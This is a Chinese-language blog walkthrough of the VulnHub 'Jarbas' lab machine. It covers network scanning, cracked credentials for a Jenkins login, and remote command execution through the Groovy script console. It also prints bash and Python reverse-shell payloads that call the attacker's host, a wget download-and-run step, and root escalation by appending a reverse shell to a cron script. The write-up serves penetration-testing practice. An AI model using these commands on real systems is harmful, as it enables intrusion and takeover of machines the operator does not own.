<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Wh1teJ0kerのBlog</title>
<meta charset=utf-8><meta name=description content="Ladder@日常练习"><meta name=author content="Wh1teJ0ker"><link rel=canonical href=https://wh1tej0ker.github.io/post/vulnhubgreas-1q5woh.html><link rel=alternate type=application/rss+xml href=https://wh1tej0ker.github.io//index.xml title=Wh1teJ0kerのBlog><script async defer data-website-id=56cc42c1-3656-4d3e-af3c-acded927b8ed src=https://analytics.umami.is/script.js></script><meta property="og:url" content="https://wh1tej0ker.github.io/post/vulnhubgreas-1q5woh.html"><meta property="og:site_name" content="Wh1teJ0kerのBlog"><meta property="og:title" content="VulnHub-Jarbas"><meta property="og:description" content="日常练习"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2025-03-03T14:42:16+08:00"><meta property="article:modified_time" content="2025-05-07T21:32:29+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnHub-Jarbas"><meta name=twitter:description content="日常练习"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wh1tej0ker.github.io/post/"},{"@type":"ListItem","position":2,"name":"VulnHub-Jarbas","item":"https://wh1tej0ker.github.io/post/vulnhubgreas-1q5woh.html"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub-Jarbas","name":"VulnHub-Jarbas","description":"日常练习","keywords":[],"articleBody":"VulnHub-Jarbas 信息搜集 主机发现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/桌面] └─$ ifconfig eth0: flags=4163 mtu 1500 inet 192.168.152.131 netmask 255.255.255.0 broadcast 192.168.152.255 inet6 fe80::3021:1752:2678:7550 prefixlen 64 scopeid 0x20 ether 00:0c:29:82:4e:1f txqueuelen 1000 (Ethernet) RX packets 75 bytes 15383 (15.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 36 bytes 10986 (10.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 4 bytes 240 (240.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4 bytes 240 (240.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 查看本机ip，扫描同一网段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -sn 192.168.152.0/24 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:14 EDT Nmap scan report for 192.168.152.1 Host is up (0.00019s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 192.168.152.2 Host is up (0.000089s latency). MAC Address: 00:50:56:FB:F0:8A (VMware) Nmap scan report for 192.168.152.133 Host is up (0.00023s latency). MAC Address: 00:0C:29:CD:D8:CF (VMware) Nmap scan report for 192.168.152.254 Host is up (0.00017s latency). MAC Address: 00:50:56:F9:E8:79 (VMware) Nmap scan report for 192.168.152.131 Host is up. Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds 经过上下线确认是靶机ip是192.168.152.133\n端口扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ──(kali㉿kali)-[~/桌面] └─$ sudo nmap --min-rate 10000 -p- 192.168.152.133 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:20 EDT Nmap scan report for 192.168.152.133 Host is up (0.000099s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql 8080/tcp open http-proxy MAC Address: 00:0C:29:CD:D8:CF (VMware) Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds 详细信息搜集 TCP扫描 基础端口开了22，80，3306，8080，基本就是正常的服务，开始进行下一步更详细的信息搜集\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.152.133 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:23 EDT Nmap scan report for 192.168.152.133 Host is up (0.00035s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Jetty 9.4.z-SNAPSHOT MAC Address: 00:0C:29:CD:D8:CF (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds 拿到了一些版本的信息和操作系统的信息，再尝试udp\nUDP扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -sU -p22,80,3306,8080 192.168.152.133 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:27 EDT Nmap scan report for 192.168.152.133 Host is up (0.00031s latency). PORT STATE SERVICE 22/udp closed ssh 80/udp closed http 3306/udp closed mysql 8080/udp closed http-alt MAC Address: 00:0C:29:CD:D8:CF (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds udp协议全部是关着的，无有效信息，开始尝试脚本扫描\nvuln脚本扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.152.133 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:28 EDT Nmap scan report for 192.168.152.133 Host is up (0.00029s latency). PORT STATE SERVICE 22/tcp open ssh 80/tcp open http |_http-trace: TRACE is enabled | http-enum: |_ /icons/: Potentially interesting folder w/ directory listing | http-sql-injection: | Possible sqli for queries: | http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider | http://192.168.152.133:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider |_ http://192.168.152.133:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. | http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.152.133 | Found the following possible CSRF vulnerabilities: | | Path: http://192.168.152.133:80/ | Form id: wmtb | Form action: /web/submit | | Path: http://192.168.152.133:80/ | Form id: | Form action: /web/20020720170457/http://jarbas.com.br:80/user.php | | Path: http://192.168.152.133:80/ | Form id: |_ Form action: /web/20020720170457/http://jarbas.com.br:80/busca/ |_http-dombased-xss: Couldn't find any DOM based XSS. 3306/tcp open mysql 8080/tcp open http-proxy | http-enum: |_ /robots.txt: Robots file MAC Address: 00:0C:29:CD:D8:CF (VMware) Nmap done: 1 IP address (1 host up) scanned in 37.80 seconds 通过脚本扫描的信息，可以看到明显是需要以80端口，也就是我们常规的web服务去做主要的突破口，\n注意\n记得随时将自己的信息整理记录，以防在下一步找不到突破口的时候，可以及时返回查询。或者是防备自己在扫描过程中有所遗漏。\n目录爆破 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[~/桌面] └─$ dirsearch -u 192.168.152.133 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/桌面/reports/_192.168.152.133/_24-03-12_22-43-47.txt Target: http://192.168.152.133/ [22:43:47] Starting: [22:43:49] 403 - 213B - /.ht_wsr.txt [22:43:49] 403 - 216B - /.htaccess.bak1 [22:43:49] 403 - 216B - /.htaccess.orig [22:43:49] 403 - 216B - /.htaccess.save [22:43:49] 403 - 217B - /.htaccess_extra [22:43:49] 403 - 214B - /.htaccess_sc [22:43:49] 403 - 214B - /.htaccessOLD [22:43:49] 403 - 214B - /.htaccessBAK [22:43:49] 403 - 215B - /.htaccessOLD2 [22:43:49] 403 - 216B - /.htaccess_orig [22:43:49] 403 - 207B - /.html [22:43:49] 403 - 218B - /.htaccess.sample [22:43:49] 403 - 206B - /.htm [22:43:49] 403 - 216B - /.htpasswd_test [22:43:49] 403 - 213B - /.httr-oauth [22:43:49] 403 - 212B - /.htpasswds [22:43:53] 200 - 359B - /access.html [22:44:00] 403 - 210B - /cgi-bin/ Task Completed 仅发现有一个access.html是开放的\nWeb渗透 查看80端口是一个Jarbas服务\n​​\n查看8080端口\n​​\n同时在之前的扫描过程中，其实还存在一个robots.txt，存在以下信息\n1 2 3 # we don't want robots to click \"build\" links User-agent: * Disallow: / 在目录扫描的过程中，发现存在以下页面\n​​\n将信息进行保留\n1 2 3 tiago:5978a63b4654c73c60fa24f836386d87 trindade:f463f63616cb3f1e81ce46b39f882fd5 eder:9b38e2b1e8b12f426b0d208a7ab6cb98 将上述的信息进行查询\n1 2 3 tiago:italia99 trindade:marianna eder:vipsu 使用eder:vipsu​成功登录，另外两个账户均显示登录无效，来到了Jenkins的后台界面。\n通过我本地存储的一些漏洞库，可以看到该系统还是有不少利用点的，挨个尝试。\n​​\n”系统管理”功能，脚本命令行的远程命令执行漏洞直接利用成功。\n​​\n简单看了一下其他两个漏洞，但是估计连命令行这个都没修复，其他两个应该也都能能打通，暂时没去尝试。\n开始尝试反弹shell，先开启监听\n1 nc -lnvp 1234 然后尝试执行命令\n1 println \"bash -c 'exec bash -i \u0026\u003e/dev/tcp/192.168.152.132/1234 \u003c\u00261'\".execute().text 直接进行反弹shell命令的执行，攻击机kali并没有接受到反弹shell，除了bash，也尝试过了netcat的，都失败了\n在经过网上查询后，尝试另一种思路，先在本机开启一个web服务\n1 python3 -m http.server 80 然后新建一个shell.py，更换ip和端口\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/python # This is a Python reverse shell script import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.152.131\",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); 开始执行命令，利用wegt去下载shell.py\n1 println \"wget http://192.168.152.131/shell.py -P /tmp/\".execute().text 此时暂时无回显，再次输入命令执行，不太确定是python3还是python成功执行反弹了shell\n1 2 println \"python3 /tmp/shell.py\".execute().text println \"python /tmp/shell.py\".execute().text 提权 拿到一个用户后，先进行枚举，确认自身状态\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sh-4.2$ whoami whoami jenkins sh-4.2$ uname -a uname -a Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux sh-4.2$ sudo -l sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. sudo: no tty present and no askpass program specified 因为知道靶机上存在python，所以再提升一下交互性\n1 python -c 'import pty;pty.spawn(\"/bin/bash\")' 继续枚举，先前的sudo和用户信息都无有效信息可以利用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 bash-4.2$ cd etc cd etc bash-4.2$ ls ls adjtime inittab profile.d aliases inputrc protocols aliases.db iproute2 python alternatives issue rc0.d anacrontab issue.net rc1.d asound.conf java rc2.d audisp jvm rc3.d audit jvm-commmon rc4.d bash_completion.d kdump.conf rc5.d bashrc kernel rc6.d binfmt.d krb5.conf rc.d centos-release krb5.conf.d rc.local centos-release-upstream ld.so.cache redhat-release chkconfig.d ld.so.conf resolv.conf chrony.conf ld.so.conf.d rpc chrony.keys libaudit.conf rpm cron.d libnl rsyslog.conf cron.daily libuser.conf rsyslog.d cron.deny locale.conf rwtab cron.hourly localtime rwtab.d cron.monthly login.defs sasl2 crontab logrotate.conf script cron.weekly logrotate.d securetty crypttab lvm security csh.cshrc machine-id selinux csh.login magic services dbus-1 mailcap sestatus.conf default makedumpfile.conf.sample shadow depmod.d man_db.conf shadow- dhcp maven shells DIR_COLORS mime.types skel DIR_COLORS.256color mke2fs.conf ssh DIR_COLORS.lightbgcolor modprobe.d ssl dracut.conf modules-load.d statetab dracut.conf.d motd statetab.d e2fsck.conf mtab subgid environment my.cnf subuid ethertypes my.cnf.d sudo.conf exports nanorc sudoers favicon.png NetworkManager sudoers.d filesystems networks sudo-ldap.conf firewalld nsswitch.conf sysconfig fonts nsswitch.conf.bak sysctl.conf fstab openldap sysctl.d gcrypt opt systemd GeoIP.conf os-release system-release GeoIP.conf.default pam.d system-release-cpe gnupg passwd terminfo GREP_COLORS passwd- tmpfiles.d groff php.d tuned group php-fpm.conf udev group- php-fpm.d vconsole.conf grub2.cfg php.ini vimrc grub.d pkcs11 virc gshadow pki wgetrc gshadow- plymouth wpa_supplicant gss pm X11 host.conf polkit-1 xdg hostname popt.d xinetd.d hosts postfix yum hosts.allow ppp yum.conf hosts.deny prelink.conf.d yum.repos.d httpd printcap init.d profile 在crontab中发现存在使用root权限去运行的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 bash-4.2$ cat crontab cat crontab SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed */5 * * * * root /etc/script/CleaningScript.sh \u003e/dev/null 2\u003e\u00261 查看脚本的详细内容\n1 2 3 4 5 bash-4.2$ cat ./script/CleaningScript.sh cat ./script/CleaningScript.sh #!/bin/bash rm -rf /var/log/httpd/access_log.txt 就是一条定时清理访问日志的shell脚本，但是给予了root那么高的权限，就可以尝试去利用。\n先开启新的监听端口\n1 nc -lnvp 3333 向脚本中写入命令\n1 echo \"/bin/bash -i \u003e\u0026 /dev/tcp/192.168.152.131/3333 0\u003e\u00261\" \u003e\u003e /etc/script/CleaningScript.sh 再次查看脚本，确认命令正确写入\n1 2 3 4 5 6 bash-4.2$ cat ./script/CleaningScript.sh cat ./script/CleaningScript.sh #!/bin/bash rm -rf /var/log/httpd/access_log.txt /bin/bash -i \u003e\u0026 /dev/tcp/192.168.152.131/3333 0\u003e\u00261 确认无误，等待命令自动执行，成功反弹shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [root@jarbas ~]# whoami whoami root [root@jarbas ~]# ip a ip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:cd:d8:cf brd ff:ff:ff:ff:ff:ff inet 192.168.152.133/24 brd 192.168.152.255 scope global dynamic ens33 valid_lft 1421sec preferred_lft 1421sec inet6 fe80::9114:a460:aa3:9dd5/64 scope link valid_lft forever preferred_lft forever 确认权限和ip正确\n得到flag\n1 2 3 4 5 6 7 8 9 10 [root@jarbas ~]# cat flag.txt cat flag.txt Hey! Congratulations! You got it! I always knew you could do it! This challenge was very easy, huh? =) Thanks for appreciating this machine. @tiagotvrs 总结 目前虽然还处于初步学习的过程，比上一台相比，对于信息搜集更加熟练，对问题信息也更加敏感，需要注意的是对于部分常用遇到的系统需要更加规范的去进行整理，比如这次遇到的jenkins，很多可利用的点可以挨个尝试，红笔师傅使用的是新建项目的命令行执行，进行反弹shell的操作，而我使用的是命令行的执行漏洞，略有不同，以后可多加尝试。暂时需要的是极大的增加学习的广度，与知识面。\n","wordCount":"3130","inLanguage":"en","datePublished":"2025-03-03T14:42:16+08:00","dateModified":"2025-05-07T21:32:29+08:00","author":{"@type":"Person","name":"Wh1teJ0ker"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wh1tej0ker.github.io/post/vulnhubgreas-1q5woh.html"},"publisher":{"@type":"Organization","name":"Wh1teJ0kerのBlog","logo":{"@type":"ImageObject","url":"https://wh1tej0ker.github.io/favicon.ico"}}}</script><link rel=icon type=image/png href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=stylesheet href=https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css><link rel=stylesheet href=/css/main.min.9d998bab4720091d5ec1e0fbbffd92b254a2e791623df6106cd7ea760bfc5c28.css integrity="sha256-nZmLq0cgCR1eweD7v/2SslSi55FiPfYQbNfqdgv8XCg=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>HOME
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/categories/>分类</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/archives/>归档</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/friends/>友链</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about/>关于</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io>Dashboard</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/Wh1teJ0ker><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>VulnHub-Jarbas</h1></header><p><small>March 3, 2025&nbsp;· &nbsp;·</small><p><div class=blog-toc><nav id=TableOfContents><ul><li><a href=#信息搜集>信息搜集</a><ul><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#详细信息搜集>详细信息搜集</a></li><li><a href=#目录爆破>目录爆破</a></li></ul></li><li><a href=#web渗透>Web渗透</a></li><li><a href=#提权>提权</a></li><li><a href=#总结>总结</a></li></ul></nav></div><section class=blog-content><h1 id=vulnhub-jarbas>VulnHub-Jarbas</h1><h2 id=信息搜集>信息搜集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ ifconfig 
</span></span><span class=line><span class=cl>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span></span><span class=line><span class=cl>        inet 192.168.152.131  netmask 255.255.255.0  broadcast 192.168.152.255
</span></span><span class=line><span class=cl>        inet6 fe80::3021:1752:2678:7550  prefixlen 64  scopeid 0x20&lt;link&gt;
</span></span><span class=line><span class=cl>        ether 00:0c:29:82:4e:1f  txqueuelen 1000  (Ethernet)
</span></span><span class=line><span class=cl>        RX packets 75  bytes 15383 (15.0 KiB)
</span></span><span class=line><span class=cl>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span class=line><span class=cl>        TX packets 36  bytes 10986 (10.7 KiB)
</span></span><span class=line><span class=cl>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
</span></span><span class=line><span class=cl>        loop  txqueuelen 1000  (Local Loopback)
</span></span><span class=line><span class=cl>        RX packets 4  bytes 240 (240.0 B)
</span></span><span class=line><span class=cl>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span class=line><span class=cl>        TX packets 4  bytes 240 (240.0 B)
</span></span><span class=line><span class=cl>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span></code></pre></td></tr></table></div></div><p>查看本机ip，扫描同一网段</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ sudo nmap -sn 192.168.152.0/24  
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:14 EDT
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.1
</span></span><span class=line><span class=cl>Host is up (0.00019s latency).
</span></span><span class=line><span class=cl>MAC Address: 00:50:56:C0:00:08 (VMware)
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.2
</span></span><span class=line><span class=cl>Host is up (0.000089s latency).
</span></span><span class=line><span class=cl>MAC Address: 00:50:56:FB:F0:8A (VMware)
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.133
</span></span><span class=line><span class=cl>Host is up (0.00023s latency).
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:CD:D8:CF (VMware)
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.254
</span></span><span class=line><span class=cl>Host is up (0.00017s latency).
</span></span><span class=line><span class=cl>MAC Address: 00:50:56:F9:E8:79 (VMware)
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.131
</span></span><span class=line><span class=cl>Host is up.
</span></span><span class=line><span class=cl>Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds
</span></span></code></pre></td></tr></table></div></div><p>经过上下线确认是靶机ip是192.168.152.133</p><h3 id=端口扫描>端口扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate 10000 -p- 192.168.152.133
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:20 EDT
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.133
</span></span><span class=line><span class=cl>Host is up (0.000099s latency).
</span></span><span class=line><span class=cl>Not shown: 65531 closed tcp ports (reset)
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>3306/tcp open  mysql
</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:CD:D8:CF (VMware)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
</span></span></code></pre></td></tr></table></div></div><h3 id=详细信息搜集>详细信息搜集</h3><h4 id=tcp扫描>TCP扫描</h4><p>基础端口开了22，80，3306，8080，基本就是正常的服务，开始进行下一步更详细的信息搜集</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.152.133
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:23 EDT
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.133
</span></span><span class=line><span class=cl>Host is up (0.00035s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
</span></span><span class=line><span class=cl>3306/tcp open  mysql   MariaDB (unauthorized)
</span></span><span class=line><span class=cl>8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:CD:D8:CF (VMware)
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span><span class=line><span class=cl>Device type: general purpose
</span></span><span class=line><span class=cl>Running: Linux 3.X|4.X
</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.9
</span></span><span class=line><span class=cl>Network Distance: 1 hop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
